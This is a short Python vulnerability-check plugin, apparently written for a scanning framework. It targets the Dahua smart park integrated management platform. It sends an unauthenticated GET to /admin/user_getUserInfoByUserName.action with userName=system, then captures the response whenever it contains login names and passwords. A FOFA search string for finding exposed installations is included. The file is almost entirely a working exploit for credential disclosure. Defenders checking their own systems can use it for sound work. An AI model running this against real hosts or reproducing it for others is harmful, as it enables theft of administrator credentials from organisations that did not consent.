#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/LAQSPMBAxSNxSWubBWFVGg',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '大华智慧园区综合管理平台user_getUserInfoByUserName.action敏感信息泄露',

      'level'     :   'high',

      'FOFA'      :   '"/WPMS/asset/lib/gridster/"||app="dahua-智慧园区综合管理平台"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/6/18',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept-Encoding': 'gzip, deflate',
      'Accept': '*/*',
      'Connection': 'close',
      }
  target = '/admin/user_getUserInfoByUserName.action?userName=system'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'extId.*?loginName.*?loginPass.*?isAdmOnline.*?macAddress',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret